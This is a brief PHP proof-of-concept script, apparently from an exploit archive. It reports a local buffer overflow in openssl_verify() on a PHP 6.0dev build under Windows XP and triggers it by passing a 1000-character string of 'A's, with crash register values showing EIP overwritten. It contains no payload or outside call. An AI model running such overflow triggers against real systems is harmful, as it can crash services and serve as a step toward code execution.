<?php
// ==================================================================================
//
// PHP 6.0 openssl_verify() Local Buffer Overflow PoC
//
// Tested on WIN XP, Apache, PHP 6.0dev. Local Buffer Overflow.
//
// Local Buffer Overflow
// Author: Pr0T3cT10n <pr0t3ct10n@gmail.com>
//
// ==================================================================================
//
// REGISTERS:
// EAX 000003D0, ECX 00BBDB28, EDX 00BBDAD8
// EBX 00BBC940, ESP 0012FB5C UNICODE "AAA...."
// ESI 00BBC940, EDI 00831D00, EBP 0012FBF0 UNICODE "AAA...."
// EIP 00410041
//
// ==================================================================================
 
$buffer = str_repeat("A", 1000);
openssl_verify(1,1,$buffer);
?>
